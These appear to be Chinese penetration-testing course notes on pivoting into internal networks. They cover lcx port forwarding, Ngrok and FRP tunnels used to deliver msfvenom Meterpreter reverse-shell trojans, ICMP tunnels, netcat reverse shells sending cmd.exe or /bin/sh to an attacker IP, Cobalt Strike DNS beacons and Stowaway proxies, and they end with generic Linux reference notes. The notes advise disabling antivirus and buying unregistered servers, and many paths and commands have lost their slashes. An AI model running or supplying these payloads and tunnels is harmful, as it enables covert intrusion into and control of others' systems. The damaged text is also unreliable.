在公⽹windows服务器上的操作 lcx.exe -tran 2222 192.168.10.129 22 #意思就是将本地2222端⼝转发给192.168.10.129主机的22号端⼝ 所以，我们ssh连接到公⽹服务器的2222端⼝即可 10-9-12 LCX实现SSH到内⽹主机(公⽹服务器是Linux) ⾸先，在VPS上进⾏下⾯操作。监听 2222 的流量，将其转发给 22222 端⼝。相当于正向代理 .lcx -m 2 -p1 22222 -h2 127.0.0.1 -p2 2222 #将本地2222端⼝的流量给本地的22222端⼝ 在内⽹主机上操作，将22端⼝的流量转发到VPS(114.118.80.138)的22222端⼝。相当于反向代理 .lcx -m 3 -h1 127.0.0.1 -p1 22 -h2 114.118.80.138 -p2 22222 #将本地22端⼝的流量给114.118.80.138的22222端⼝ 我们连接VPS的2222端⼝，就相当于连接了内⽹主机的22端⼝。 ssh root@114.118.80.138 2222 #连接到114.118.80.138的2222端⼝ 10-9-13 LCX实现3389到内⽹主机(公⽹服务器是Windows)现在我们有这么⼀个环境，我们获得了公⽹Windows服务器的权限，并且通过公⽹服务器进⼀步的内⽹渗透，得到了内⽹Linux主机的权限。拓扑图如下。我们现在想SSH到内⽹Linux主机。 于是，我们还可以利⽤lcx来进⾏3389端⼝的转发。在公⽹windows服务器上的操作 lcx.exe -tran 3340 192.168.10.18 3389 #意思就是将本地的3340端⼝的流量转发给192.168.10.18主机的3389端⼝ 于是，我们远程连接公⽹服务器100.100.10.14的3340端⼝ 10-9-14 LCX实现3389到内⽹主机(公⽹服务器是Linux)现在我们有这么⼀个环境，我们获得了公⽹Linux服务器的权限，并且通过公⽹服务器进⼀步的内⽹渗透，得到了内⽹Windows主机的权限。拓扑图如下。现在我们想3389连接到内⽹Windows服务器。 在公⽹Linux服务器上的操作 .lcx -m 2 -p1 23389 -h2 127.0.0.1 -p2 13389 #监听本地23389的流量转发给本地的13389端⼝，正向代理 在内⽹Windows服务器上的操作 lcx.exe -slave 192.168.10.20 13389 127.0.0.1 3389 #将本地3389端⼝的流量都转发给192.168.10.20，反向代理 远程连接公⽹服务器的23389端⼝即可 10-10 内网穿透10-10-1 Ngrok内网穿透(http代理)内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被NAT 设备屏蔽而正确路由到内网主机，ngrok是一个内网穿透的解决方案,它使得你本地的服务器可以被局域网外的公网访问，ngork有服务端和客户端，服务端运行在公网服务器，客户端运行在本地服务器ngrok，服务端会建立http和https服务，默认端口80443，以及供ngrok客户端连接的服务，默认端口4443。它是国外的一款老牌的内网穿透工具。 https://ngrok.com/ 国外地址 https://www.ngrok.cc/ 国内地址 ## 攻击机要安装Ngrok，被攻击机只需要正常启动 ## 下载好Ngrok的文件sunny，来到所在文件夹 运行sunny .sunny clientid [隧道id] .sunny clientid b….k ## 显示online说明登录成功。被攻击机访问Forwarding里的网址会指向到填写的本地端口生成后门，注意选择对应的网络协议，填写好地址： syrjaden.free.idcfengye.com 是我们开通隧道之后生成的，在隧道管理的地方有 msfvenom -p windowsmeterpreterreverse_http lhostsyrjaden.free.idcfengye.com lport80 -f exe -o jaden.exe ## 监听后门，监听之前填的本地端口 msfconsole use exploitmultihandler set payload windowsmeterpreterreverse_http set lhost 192.168.0.11 kali本机的ip地址 set lport 6666 在隧道中指定的端口号 Exploit ## 在被攻击机执行后门 注册账号，然后登录 开通隧道 购买免费服务器，网速差点，然后填写隧道信息： 下载客户端 演示示例 两个不同网段的内网主机实现通信。 准备环境： (控制端)攻击主机kali，大家可以用最新版的 (被控端)目标主机：我用的win7，按照流程大家可以使用其他的主机系统,先看一下kali的IP地址 然后修改一下ngrok隧道中的控制机ip和端口，就是那个本地端口 首先在控制端kali中运行我们下载的Ngrok的客户端，我放在了mnt目录下 效果如下，看到online表示正常，如果不是，那就有问题 ## 控制端生成木马 msfvenom -p windowsmeterpreterreverse_http lhostsyrjaden.free.idcfengye.com lport80 -f exe -o jaden.exe 将木马放到被控制端 被控端ip地址为192.168.0.13，按理说应该让他们不能直接互通，但是我这里只有一个网络，所以不能设计这样的场景，就用两个同一网段的虚拟机来搞了。注意，两个主机都是能上网的才行昂。控制端开启监听 在被控端运行我们的木马程序，然后观察我们的kali上的Ngrok，收到了数据。 10-10-2 FRP内网穿透(ftp代理)Ngrok是别人的跳板机，我们如果想搭建自己的跳板机，就可以使用frp、nps等工具。 frp 是基于GO语言的一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网，目前最主流的一个内网穿透工具，还有个叫做nps的，也很厉害，但是frp的用户量比nps大一些，frp是开源的可以自建跳板的工具，而ngrok呢是属于使用别人的公网服务器，那么我们测试的时候如果有一些隐私、小秘密啥的，那么就会感觉有些不安全了，因为ngrok的作者应该是可以任意登录上去查看你收集的信息的，所以很多人喜欢自己来搭建服务器，这时候就可以用到frp，并且我们需要自己提前准备一台公网服务器，腾讯云、阿里云等等，如果用阿里云的话，会受到一个安全组的机制限制，所以我们最好不要用阿里云，因为总需要调整安全组策略，比较麻烦，有条件的话最好买一些黑服务器，不需要实名啥的，可能价格会高一些，但是不受限制，比如流量、端口设置等限制 1，服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口） ## 服务器修改配置文件frps.ini： bind_port 6677 #frps工作端口，必须和frpc保持一致 ## 启动服务端： .frps -c .frps.ini 2.控制端-下载-解压-修改-启动 ## 控制端修改配置文件frpc.ini： server_addr [你的云主机ip] server_port 6677 #frpc工作端口，必须和frps保持一致 [msf] type tcp local_ip 127.0.0.1 local_port 5555 #转发给本机的5555 remote_port 6000 #服务端用6000端口转发给本机 ## 启动客户端： .frpc -c .frpc.ini ## 生成后门 msfvenom -p windowsmeterpreterreverse_tcp lhost[服务器IP地址] lport6000 -f exe -o frp.exe ## 监听后门 use exploitmultihandler set payload windowsmeterpreterreverse_tcp set LHOST 127.0.0.1 set LPORT 5555 exploit 3.靶机运行frp即可 ## Sunny-Ngrok（也提供FRP）：http://www.ngrok.cc/ ## 了解如何部署、使用frp：https://gofrp.org/docs/ ## frp：https://github.com/fatedier/frp ## CFS三层靶机环境：https://pan.baidu.com/s/1l5-TOVe9FO8mEjCiZ4mtMQ 提取码：xiao 实验 环境：frp是一个CS架构的程序，有客户端和服务端 ## 服务端(阿里云服务器，我的是utuntu18.04，1vcpu,2g内存) ## 客户端(攻击机：kali2022) ## 肉鸡(win7) 下载FRP 先下载frp，目前版本是0.44.0 客户端 放到kali上，解压 在kali上配置客户端配置文件 服务端 将我们下载的frp放在阿里云服务器上，现在阿里云服务器有安全管控功能了，我们直接在阿里云上解压，会被阻拦，所以我们在本机解压好，通过sftp上传上去。 解压并配置frps.ini，修改端口号，和我们刚才在客户端配置文件中配置的server_addr要一致 运行服务端的frp程序 .frps -c .frps.ini ，刚开始可能没有权限执行，需要加执行权限 注意在阿里云实例中添加安全组规则，将6677和6000端口放行 然后运行客户端程序 服务端就收到了客户端的连接数据 接下来生成后门程序，然后到肉机上执行 msfvenom -p windowsmeterpreterreverse_tcp lhost182.92.4.57 lport6000 -f exe -o frp.exe ，lport对应的是kali上frpc配置中的remote_addr的值。 msfvenom -p windowsmeterpreterreverse_tcp lhost182.92.4.57 lport6000 -f exe -o frp.exe 然后msf开启监听，监听的ip和port和上面客户端的frpc配置的local_ip和local_port一致 拿到win7上执行，关闭杀软或者对目录免杀处理，别杀掉了 双击运行frp.exe程序，然后再看kali，收到会话了 shell进去可以执行指令 frp比ngrok更加灵活，因为我们自己搭建的，地址都可以我们自己指定。 10-10-3 隧道内网渗透包含：局域网、域渗透、内网穿透等技术，内网穿透又分代理和隧道。 内网穿透主要是为了解决内网中通信的问题，代理可以解决一些防火墙的拦截问题，隧道可以解决一些 安全设备、流量监控等设备的拦截问题。 ## 常用的隧道技术有以下三种： 网络层：IPv6隧道、ICMP隧道 传输层：TCP隧道、UDP隧道、常规端口转发 应用层：SSH隧道、HTTPS隧道、DNS隧道 检测网络联通情况 1.TCP协议 ## 用“瑞士军刀”netcat，执行nc命令： nc 端口 ## 还有个lcx 2.HTTP协议 ## 用curl工具，执行： curl IP地址:端口 ## 如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息 3.ICMP协议 ## 用ping命令，执行： ping IP地址域名 4.DNS协议 ## 检测DNS连通性常用的命令是nslookup和dig ## nslookup是windows自带的DNS探测命令 ## dig是linux系统自带的DNS探测命令 3-1 网络层ICMP隧道示例ptunnel是老牌的一个工具，有windows、linux版本的，其实不推荐使用，因为不怎么更新了，但是有一个升级版的pingtunnel工具一直在更新，这个挺好。现在我们演示的还是这个老牌的，将来大家如果有这方面的需要，建议新版的，并且新版的支持各类操作系统 防火墙一般不会屏蔽ping的数据包，实现不受限制的访问访问。 参数说明： -p ## 表示连接icmp隧道另一端的机器IP（即目标服务器） -lp ## 表示需要监听的本地tcp端口 -da ## 指定需要转发的机器的IP（即目标内网某一机器的内网IP） -dp ## 指定需要转发的机器的端口（即目标内网某一机器的内网端口） -x ## 设置连接的密码 准备测试环境 centos7 配置双网卡 然后进入命令终端进行配置，我们看到多出来一个ens36，对它再进行配置即可 cd etcsysconfignetwork-scripts cp ifcfg-ens33 ifcfg-ens36 修改ifcfg-ens36的配置，如下 TYPE”Ethernet” PROXY_METHOD”none” BROWSER_ONLY”no” BOOTPROTO”static” DEFROUTE”yes” IPV4_FAILURE_FATAL”no” IPV6INIT”yes” IPV6_AUTOCONF”yes” IPV6_DEFROUTE”yes” IPV6_FAILURE_FATAL”no” IPV6_ADDR_GEN_MODE”stable-privacy” NAME”ens36” # UUID”be3c28c6-18bd-4191-a425-55836be83dd1” DEVICE”ens36” ONBOOT”yes” IPADDR”192.168.11.120” 然后重启网卡 systemctl restart network ，看到我们设置的ip地址了 目标主机win7的网卡ip也改一下，和centos7一个网段 两个内网的ip都配置好了，我们互相ping一下，看看内网的两个ip是否互通，kali攻击主机和内网中的win7主机是否不通。 对了，别忘了开启win7的远程连接 好，测试环境准备完毕，并且充分证明win7这个主机的ICMP协议可以正常通信，这是前提条件昂，必须正常才行。 开始测试 kali上执行： .ptunnel -p 192.168.241.193 -lp 1080 -da 192.168.11.121 -dp 3389 -x jaden 中间主机centos7开启隧道，密码为jaden centos7 安装ptunnel https://www.cnblogs.com/autopwn/p/14642658.html #安装libpcap的依赖环境 cd opt yum -y install byacc yum -y install flex bison #安装libpcap依赖库 wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz tar -xzvf libpcap-1.9.0.tar.gz cd libpcap-1.9.0 .configure make make install #安装PingTunnel cd opt wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz tar -xzvf PingTunnel-0.72.tar.gz cd PingTunnel make make install ## 安装完成之后直接可以执行命令 ## 在中介机centos7执行： .ptunnel -x [密码] .ptunnel -x jaden ## 启动ptunnel，设置连接密码为jaden ## 在攻击机kali jaden执行： .ptunnel -p [中介机] -lp [本机端口] -da [被攻击机] -dp [被攻击机端口] -x [密码] .ptunnel -p 192.168.241.193 -lp 1080 -da 192.168.11.121 -dp 3389 -x jaden ## 当192.168.241.193（p）收到来自192.168.11.121（da）的3389端口（dp）的数据时，发送到攻击机的1080端口（lp）。反之亦然（在二者之间建立隧道） rdesktop [IP] [端口] rdesktop 127.0.0.1:1080 ## 调用远程桌面访问本地的1080，也就是目标机的3389 老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译) 新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版) 安装完上面的工具之后，执行 .ptunnel -x jaden 可能会看到如下报错 修改如下内容 ## 第一步，建立软链 sudo ln -s usrlocalliblibpcap.so.1 usrliblibpcap.so.1 ## 第二步：添加两个路径 ## 将libpcap.so.1所在目录添加到文件etcld.so.conf中， vi etcld.so.conf ## 加上下面两个 usrlocallib usrlib ## 然后保存 ## 第三步：重新加载配置，如果你是root用户，就不用写sudo了 sudo ldconfig 然后重新执行指令 在攻击机上再启用一个终端，执行连接指令 rdesktop 127.0.0.1:1080 ,效果如下，如果一次没有成功就多执行几次这个指令 这样做有什么意义呢？我们如果通过centos7主机直接连接win7主机的3389，可能由于centos7主机上防火墙的问题过滤了3389端口数据，导致我们攻击机不能拿到交互数据，那么这个工具其实是没有使用远程桌面连接协议来传输数据，可能底层是tcp‘协议，而是变换成了icmp协议来传递tcp协议的数据。这就是一个icmp协议隧道。 3-2 传输层TCP隧道之端口转发Windows：lcx Linux：portmap https://github.com/MrAnonymous-1/lcx ## 在被攻击机上： lcx -slave [中介机IP] 3131 127.0.0.1 3389 ## 将（被攻击机）本地的3389跟中介机IP的3131建立隧道 ## 在中介机上： lcx -listen [本机端口] [攻击机端口] lcx -listen 3131 3333 ## 监听3131转发至3333 ## 在攻击机上： rdesktop [中介机IP]:3333 ## 远程连接 lcx演示，我们前面讲过lcx和nc，这里就不多演示了。在看一个nc的示例吧，NC这个东西在windows和linux上都能用，并且linux是自带这个指令的，但是自带的可能版本比较老，比较老的话可以不支持-e参数，但是我们最好注意的就是要使用最新版本或者说高版本 ## 要确定为是否为最新版本，老版本不支持-e写法 ## Linux自带nc ## 受害主机能找到攻击机就用正向，不能则用反向 1.双向连接反弹shell 正向：攻击连接受害 ## 受害： nc -ldp 1234 -e binsh ## linux nc -ldp 1234 -e c:\\windows\\system32\\cmd.exe ## windows ## 将命令行界面（shellcmd）推到1234端 ## 攻击： nc 192.168.241.132 1234 主动连接 反向：受害连接攻击 ## 攻击： nc -lvp 1234 ## 监听自己的1234端口 ## 受害： nc [攻击机IP] 1234 -e binsh nc [攻击机IP] 1234 -e c:\\windows\\system32\\cmd.exe ## 将命令行界面（shellcmd）推到攻击机IP的1234端 2.多向连接反弹shell-配合转发 ## 反向： god\\Webserver： Lcx.exe -listen 2222 3333 god\\Sqlserver： nc 192.168.241.31 2222 -e c:\\windows\\system32\\cmd.exe kali： nc -v 192.168.0.11 3333 ## SQL服务器将自己的cmd映射到网络服务器的2222端口，网络服务器再将2222映射到自己的3333端口，最后由攻击机访问 3.相关netcat主要功能测试 指纹服务：nc -nv 192.168.0.11 端口扫描：nc -v -z 192.168.0.11 1-100 端口监听：nc -lvp xxxx 文件传输：nc -lp 1111 1.txt|nc -vn xx.xx.x.x 1111 1.txt -q 1 反弹Shell：见上 NC支持正向和反向连接，我们通过一个多向连接反弹shell的示例给大家讲解。 场景：win7的shell转发到win10再转发到kali，win7和kali不能直接通信。 win7: 192.168.11.121 webserver: 192.168.11.122 192.168.0.14 kali: 192.168.0.11 win10双网卡 win10上执行LCX监听： Lcx.exe -listen 2222 3333 将win7主机的端口数据(cmd终端数据)通过nc转发出来 nc 192.168.11.22 -e c:\\windowssystem32\\cmd.exe win10上收到了数据 通过kali来连接win10主机的3333端口，linux自带nc nc 192.168.0.16 3333 shell反弹成功。 nc走的是tcp协议，如果对方没有禁掉tcp协议，那么就可以通过nc转发来控制目标 nc出了端口监听、端口转发之外，还有其他的功能，比如端口扫描、指纹信息探测、文件传输 比如：端口扫面 3-3 应用层DNS隧道实战中用的最多的，也是我们最重要的一个隧道，网络层和传输层的隧道在实战中可能经常被拦截。 我们演示一个DNS隧道配合CS来上线内网主机。 ## 应用层DNS隧道配合CS上线-检测，利用，说明 ## 当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀 1.云主机Teamserver配置端口53和50050启用 2.买一个域名修改解析记录如下： 记录类型-主机记录-记录值 A记录-cs主机名-CS服务器IP NS记录-ns1主机名-上个A记录地址 NS记录-ns2主机名-上个A记录地址 3.配置DNS监听器内容如下： a1.wulaobao.top a2.wulaobao.top www.wulaobao.com ## 配置方法： “Listeners”“Add”，“Payload”选“Beacon DNS”，“DNS Hosts”填入“a1.wulaobao.top”和“a2.wulaobao.top”，“DNS Host(Stager)”填“www.wulaobao.com” 4.生成后门执行上线后启用命令： ## 用刚配置的DNS监听器生成后门 ## 使用DNS连接时，主机刚上线可能显示为“[unkown]”，这是因为该方法连接速度慢 ## 连接后需要执行几条命令实现控制 命令： checkin mode dns-txt ## 有如同“host called home, sent: 8 bytes”的数据传输，说明成功 执行个命令验证一下 shell whoami 命令与回显： beacon checkin [] Tasked beacon to checkin beacon mode dns-txt [+] data channel set to DNS-TXT [+] host called home, sent: 8 bytes beacon shell whoami [] Tasked beacon to run: whoami [+] host called home, sent: 53 bytes 域名解析配置 添加域名解析记录 添加安全组，开放53端口 CS服务端设置 将CS和jdk上传到云主机的 opt 目录下，我的云主机用的centos7系统 然后安装jdk，给cs赋值执行权限，然后运行cs服务端，如下 rpm -ivh jdk-8u102-linux-x64.rpm yum install unzip -y unzip cobaltstrike4.zip cd cobaltstrike4 chmod +x * .teamserver 172.21.154.225 jaden 云主机的CS服务端启动，效果如下，启动密码为 jaden 启动teamserver的时候，指定的ip地址使用我们购买的云主机上时提示的内网ip地址，如下 CS客户端连接 启动之后如下，创建监听器 cs生成监听器的时候可以选择各种协议，还可以给cs添加插件来多添加几个协议进来，比如，很多安全设备对http协议的数据都有监控，如果我们的流量数据是通过http协议传输的，那么很容易被监控到，所以要换一个协议，比如使用DNS协议，如下 生成后门 选择监听器 上线主机 比如，用win7主机试试，将木马上传到win7上执行 权限维持 linux：rootkit，进程注入，ssh后门、pam后门、vim后门、协议后门、suid后门、strace后门、inetd服务后门 windows： 服务、注册表、启动项、计划任务、web后门、黄金白银票据 https://blog.csdn.net/FisrtBqy/article/details/124418779 https://www.freebuf.com/articles/web/180581.html https://zhuanlan.zhihu.com/p/401733128 https://www.cnblogs.com/xiaozi/category/1582391.html 10-10-4 stowawayStowaway ## 目前有很多优秀的内网代理工具如frp, nps等，但是有些情况下，我们需要搭建多级网络代理，直达目标内网深处。而目前frp，nps等工具在搭建多级代理时操作过去复杂不便于管理。 ## 而Stowaway工具就是需要解决这一问题。Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具，用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能。 项目地址：https://github.com/ph4ntonn/Stowaway ## towaway一共包含两种角色，分别是： admin 代表控制端 agent 代表被控端 ## 名词定义 节点: 指admin || agent 主动模式: ## 指当前操作的节点主动连接另一个节点 被动模式: ## 指当前操作的节点监听某个端口，等待另一个节点连接 上游: ## 指当前操作的节点与其父节点之间的流量 下游：## 指当前操作的节点与其所有子节点之间的流量 环境搭建 代理搭建 admin -l ## 被动模式下的监听地址[ip]: -s ## 节点通信加密密钥,所有节点(adminagent)必须一致 -c ## 主动模式下的目标节点地址 –proxy ## socks5代理服务器地址 –proxyu ## socks5代理服务器用户名(可选) –proxyp ##socks5代理服务器密码(可选) –down ## 下游协议类型,默认为裸TCP流量,可选HTTP agent -l ## 被动模式下的监听地址[ip]: -s ## 节点通信加密密钥 -c ## 主动模式下的目标节点地址 –proxy ## socks5代理服务器地址 –proxyu ## socks5代理服务器用户名(可选) –proxyp ## socks5代理服务器密码(可选) –reconnect ## 重连时间间隔（s） –rehost ## 端口复用时复用的IP地址 –report ## 端口复用时复用的端口号 –up ## 上游协议类型,默认为裸TCP流量,可选HTTP –down ## 下游协议类型,默认为裸TCP流量,可选HTTP –cs ## 运行平台的shell编码类型，默认为utf-8，可选gbk 一级代理 1. 控制端配置 上传控制端到kali，使用被动模式，监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接 .linux_x64_admin -l 192.168.125.134:8000 -s 123 #或者不指定ip默认监听0.0.0.0 .linux_x64_admin -l 8000 -s 123 2. 被控端配置 在win2012-1上执行，使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端 windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 –reconnect 8 此时客户端与控制端间搭建了一条socks隧道。 admin控制端命令 在admin控制台中，用户可以用tab来补全命令，方向键上下左右来查找历史移动光标。admin控制台分为两个层级，第一层为main panel，第二层为node panel main panel 输入help查看详细使用参数 detail\t## 展示在线节点的详细信息 topo ## 展示在线节点的父子关系 use ## 使用某个agent exit ## 退出 node panel 当客户端连接控制端后，使用detail就可以查看到目前有哪些客户端已经连接，使用use 节点，然后会进入这个节点的控制面板 1，接着我们设置socks5代理端口为7777，连接账号密码为 admin admin，供测试人员进行连接访问代理 socks 7777 admin admin 2，使用proxifier连接控制端 此时成功访问第一层网络10.x 二级代理 在上述代理保持不变的情况下，如下操作 1. 在win2012-1上开启一个监听，监听10000端口 2，win7主动连接win2012-1的10000端口 windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 –reconnect 8 ## 此时控制端会立即显示新加入的节点 此时proxifier再添加代理服务器和代理规则即可访问第二层网路20.x 一，Linux1-1 重要文件目录1-1-1 系统运行级别etcinittab 1-1-2 开机启动配置文件etcrc.local etcrc.drc[0~6].d ## 当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 etcinit.d 目录下，然后在 etcrc.drc.d 中建立软链接即可 ln -s etcinit.dsshd etcrc.drc3.dS100ssh ## 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。 1-2-3 系统日志##日志默认存放位置： varlog ## 查看日志配置情况： more etcrsyslog.conf 1-2-4 验证和授权方面的信息varlogsecure 1-2-5 网卡配置文件etcsysconfignetwork-scripts VM虚拟机：ifcfg-ens33 VM虚拟机：ifcfg-ens192 云主机：ifcfg-eth0 物理机：em1 em2 em3 em4 TYPE”Ethernet” 网卡类型（以太网） PROXY_METHOD”none” 无代理 BROWSER_ONLY”no” BOOTPROTO”static” 即boot protocol（启动协议）,网卡获取IP地址的方式，DHCP动态，STATIC静态 DEFROUTE”yes” IPV4_FAILURE_FATAL”no” IPV6INIT”yes” IPV6_AUTOCONF”yes” IPV6_DEFROUTE”yes” IPV6_FAILURE_FATAL”no” IPV6_ADDR_GEN_MODE”stable-privacy” NAME”ens33” 网卡名称 DEVICE”ens33” ONBOOT”yes” 开始是否启动网卡 IPADDR IP协议中提供的逻辑地址，即IP地址 xxx.xxx.xxx.xxx，可通过ip a查询分配的ip地址 NETMASK 子网掩码，一般为255.255.255.0 快速寻址 划分子网 GATEWAY 网关，控制数据从一个网段进入另一个网段，相当于家中的路由器，在虚拟机的虚拟网络编辑器中找 DNS1 域名解析协议，将域名与ip地址一一对应，一般写成网关 DNS2 可以配置成114.114.114.114等 1-2-6 更改主机名etchostname 文件 hostname set-hostname xxxx 更改主机名 1-2-7 本地DNS域名解析etchosts 文件 1-2-8 设置DNSetcresolv.conf 1-2-9 全局配置文件，代理，路径etcprofile 1-2-10 用户级别操作.bash_profile 文件 1-2-11 查看shelletcshells 文件 1-2-12 Bash全局配置文件，全局操作etcbashrc 文件 1-2-13 用户级别.bashrc 文件 1-2-14 内核版本etcredhat-release 文件 1-2-15 运行级别etcinittab 文件 1-2-16 root用户权限etcsudoers 文件 1-2-17 yum软件仓库源etcyum.repos.d 文件 1-2-18 文件安装解压缩…usrlocal 目录 1-2-19 内核配置文件（内核转发 内核端口范围）etcsysctl.conf 文件 1-2-20 日志文件usrlog 目录 日志文件 messages\t## 系统级日志文件 secure ## 安全日志文件 dmesg ## 硬件信息加载情况日志文件 cron ## 定时任务日志文件 wtmp ## 登录者信息文件 lastlog ## 用户近期登录情况 1-2-21 定时任务etccrontab 目录 cron.daily cron.hourly cron.monthly cron,weekly cron.d 1-2- 其他etcsysconfignetwork-scriptsifcfg-eth0 网络接口配置文件 etcudevrules.d70-persistent-net.rules 网络的逻辑名称 etcgroup 组配置文件 etcpasswd 用户配置文件 binbash 用户shell所在目录 etcprofile 系统级用户环境变量profile etcbashrc 系统级的hashrc文件 etcfstab 磁盘挂载点所在的文件 etcyum.repos.d yum库源文件所在目录 etcinitrcS.conf 系统启动选项 etcsecuritylimits.conf 用户限制所在目录 etcselinuxconfig SeLinux配置文件 etcinittab init的配置文件，设置系统启动界面（命令行、图形界面） etcsysconfignetwork (机子名称配置文件） etcsysconfignetwork-scriptsifcfg-eth0 （网络接口配置文件，用于IP地址的设置） etcresolv.conf ( DNS服务器配置文件，最多3条DNS配置信息 ) etchosts ( 本地主机名称解释文件 ) etcsysconfigi18n ( 系统字体配置文件 ) etcexports ( nfs服务器的配额文件) etcsyslog.conf ( syslogd服务的配置文件) etccrontab ( 系统任务配置文件 ) etcspoolcronroot ( root的cron任务文件 ) etcrc.local ( 系统启动完成初始化脚本的执行后，执行该脚本，将共享文件挂载配置在该脚本中 ) etcrc.drc.sysinit ( 系统启动时被调用执行的系统初始化脚本 ) etcinittab ( 系统运行中第一个进程INIT的配置文件，INIT进程运行后将按照该文件中的配置内容启动系统中需要运行的程序 ) etcinit.d ( 系统服务启动程序脚本 ) etcprofile.d ( 系统别名自定义文件夹 ) root.bash_history ( root的命令历史文件，其用户保存在“home用户”文件夹下) etcbashprofile 和 etcbashrc (环境变量配置文件) home用户.bash_profile 和 home用户.bashrc (用户的环境变量配置文件) etcskel (初始的用户配置模板，当用户对自己的配置文件做了错误的设置后，可拷贝该目录中模板文件复制到用户目录进行初始化的恢复) etcShells (当前系统中能使用的shell程序列表) etcpasswd (用户帐号文件，保存所有的用户账号) etcshadow （保存密文的用户口令，仅root用户能够查看） root.sshauthorized_keys root.sshid_rsa root.sshid_ras.keystore root.sshknown_hosts 记录每个访问计算机用户的公钥 etcpasswd etcshadow etcmy.cnf mysql配置文件 etchttpdconfhttpd.conf apache配置文件 root.bash_history 用户历史命令记录文件 root.mysql_history mysql历史命令记录文件 procmounts 记录系统挂载设备 porcconfig.gz 内核配置文件 varlibmlocatemlocate.db 全文件路径 porcselfcmdline 当前进程的cmdline参数 1-2 常用指令1-2-1 telnet查看远程主机某个端口号是否开启 telnet 101.132.222.28 3306 ## 查看某个端口是否开放 —————— 需要安装 yum install telnet 1-2-2 netstat## netstat命令是Linux下的一个网络统计工具，用于显示网络连接、路由表、接口统计等信息。以下是一些常用的netstat命令参数： - -a：## 显示所有连接和监听端口。 - -n：## 以数字形式显示地址和端口号，不进行域名解析。 - -p：## 显示进程标识符和程序名称，此选项需要root权限。 - -t：## 仅显示TCP连接。 - -u：## 仅显示UDP连接。 - -l：## 仅显示监听状态的套接字。 - -r：## 显示路由表信息。 - -i：## 显示网络接口信息。 - -s：## 显示网络统计信息，包括协议、接口、发送和接收的数据包数量等。 - -c：## 每隔指定秒数刷新一次网络状态信息。 例如，要查看所有TCP连接，可以使用以下命令： netstat -lnt 1-2-3 nslookup dig## 查询dns域名记录 nslookup baidu.com ## ———————————— 需要安装 yum install bind-utils -y ## Linux中的dig命令是一个DNS查询工具，用于查询DNS记录。它支持多种类型的DNS查询，包括A、AAAA、MX、NS等记录类型。 - +short：## 使用缩写形式显示结果。 - +noall：## 不显示所有记录。 - +answer：## 只显示应答部分。 - +stats：## 显示统计信息。 - +timeX：## 设置超时时间为X秒。 - +retry：##尝试重新查询DNS服务器直到成功或达到最大重试次数。 - +filterX：## 只显示符合指定条件的记录。 - +a：## 显示所有类型的记录。 - +typeX：## 只显示指定类型的记录。 - +tcp：## 只显示TCP类型的记录。 - +udp：##只显示UDP类型的记录。 - +name：##只显示指定名称的记录。 - +classX：## 只显示指定类别的记录。 - +rdatatypeX：## 只显示指定数据类型的记录。 - +srvtypeX：## 只显示指定服务类型的记录。 - +soa：## 只显示SOA记录。 - +mx：## 只显示MX记录。 - +ptr：##只显示PTR记录。 - +ns：## 只显示NS记录。 - +cname：## 只显示CNAME记录。 - +inaddr：## 只显示IP地址记录。 - +isdn：## 只显示ISDN记录。 - +arpa：## 只显示ARPA记录。 - +authority：## 只显示授权记录。 - +ixfr：## 只显示IXFR记录。 - +proxy：## 只显示代理记录。 - +ftp：### 只显示FTP记录。 - +hinfo：## 只显示主机信息记录。 - +nis：# 只显示NIS记录。 - +serverX：## 只显示指定服务器的记录。 - +nsec3_response：## 只显示NSEC3响应记录。 - +nsec3_query：只显示NSEC3查询记录。 - +bits：## 只显示位标记记录。 - +timestamp：# 只显示时间戳记录。 1-2-4 查看提供某个命令的软件包yum provides 软件包名字 1-2-5 who | w | uptimewho ## 查看当前登录用户（tty本地登陆 ,pts远程登录，比如用xshell这种工具连接登录上去的 w ## 查看系统信息，想知道某一时刻用户的行为 uptime ## 查看登陆多久、多少用户，负载 1-2-6 查看特权用户awk -F: ‘$30{print $1}’ etcpasswd 1-2-7 查看能远程登录用户awk ‘$1|$6{print $1}’ etcshadow 1-2-8 检查sudo 权限的用户more etcsudoers | grep -v “^#|^$” | grep “ALL(ALL)” 1-2-9 查看某个pid对应的程序文件ls -l proc$PIDexe或file proc$PIDexe（$PID 为对应的pid 号） 1-2-10 查看系统的运行级别## 查看运行级别命令 runlevel vi etcinittab id3：initdefault ## 系统开机后直接进入哪个运行级别 1-2-11 建立软连接ln -s etcinit.dsshd etcrc.drc3.dS100ssh ## 此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。 1-2-12 服务第一种修改方法： chkconfig [–level 运行级别] [独立服务名] [on|off] chkconfig –level 2345 httpd on ## 开启自启动 chkconfig httpd on ## （默认level是2345） 第二种修改方法： 修改etcre.drc.local 文件 加入 etcinit.dhttpd start 1-2-13 查看已安装的服务RPM包安装的服务 chkconfig –list ### 查看服务自启动状态，可以看到所有的RPM包安装的服务 ps aux | grep crond ## 查看当前服务 系统在3与5级别下的启动项 chkconfig –list | grep “3:启用|5:启用” ## 中文环境 chkconfig –list | grep “3:on|5:on” ## 英文环境 源码包安装的服务 ## 查看服务安装位置 ，一般是在userlocal service httpd start ## 搜索etcrc.dinit.d 查看是否存在 1-2-14 nc命令g网关 ## 设置路由器跃程通信网关，最多可设置8个。 -G指向器数目 ## 设置来源路由指向器，其数值为4的倍数。 